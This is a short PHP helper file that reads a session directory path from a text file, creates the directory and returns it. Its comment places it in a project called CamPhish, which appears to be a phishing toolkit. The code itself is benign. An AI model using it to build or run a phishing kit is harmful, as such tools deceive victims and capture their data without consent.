<?php
/**
 * Session directory helper for CamPhish
 * Reads the active session directory from session_dir.txt and ensures it exists.
 */
function getSessionDir() {
    $config = __DIR__ . '/session_dir.txt';
    if (file_exists($config)) {
        $dir = trim(file_get_contents($config));
        if (!empty($dir)) {
            // Support both absolute and relative paths
            $fullPath = (strpos($dir, '/') === 0) ? $dir : __DIR__ . '/' . $dir;
            if (!is_dir($fullPath)) {
                @mkdir($fullPath, 0755, true);
            }
            return rtrim($fullPath, '/') . '/';
        }
    }
    return __DIR__ . '/';
}
$session_dir = getSessionDir();
?>
